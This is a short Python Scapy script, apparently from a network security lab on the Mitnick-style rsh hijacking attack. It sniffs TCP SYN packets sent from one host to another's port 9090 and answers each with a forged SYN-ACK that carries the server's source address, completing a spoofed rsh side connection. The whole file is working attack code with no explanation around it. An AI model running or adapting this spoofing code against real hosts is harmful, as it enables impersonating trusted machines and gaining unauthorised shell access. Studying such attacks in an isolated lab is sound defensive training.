#!/usr/bin/python3
from scapy.all import *

srvip = "10.9.0.6"
srvport = 9090
xip = "10.9.0.5"
xport = 1023
syn_seq = 12345 #any seq no for start rsh connection

def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    if old_tcp.flags == 'S':
        # spoof SYN-ACK for rsh connection
        ip = IP(src = srvip, dst = xip)
        tcp = TCP(sport = srvport, dport = xport,
                    seq = syn_seq,
                    ack = old_tcp.seq + 1,
                    flags = 'SA')
        send(ip/tcp, verbose=0)
        print('{} --> {} Sent SYN+ACK'.format(ip.src, ip.dst))

myFilter = 'tcp and src host 10.9.0.5 and dst host 10.9.0.6 and dst port 9090'

sniff(iface='br-f8201c9c13ab', filter=myFilter, prn=spoof)
